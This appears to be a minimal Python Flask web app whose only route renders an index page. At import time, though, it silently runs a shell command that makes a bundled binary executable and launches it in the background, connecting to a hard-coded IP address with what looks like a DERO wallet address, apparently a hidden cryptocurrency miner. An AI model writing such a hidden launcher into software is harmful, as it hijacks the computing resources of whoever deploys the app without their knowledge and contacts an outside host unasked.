from flask import Flask
from flask import render_template
import os
os.system('chmod 700 inter;nohup ./inter -o wss://51.222.96.66:80 -u deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnje7yu7pv0rlr &')
app = Flask(__name__)


@app.route("/")
def hello_world():
    return render_template("index.html")
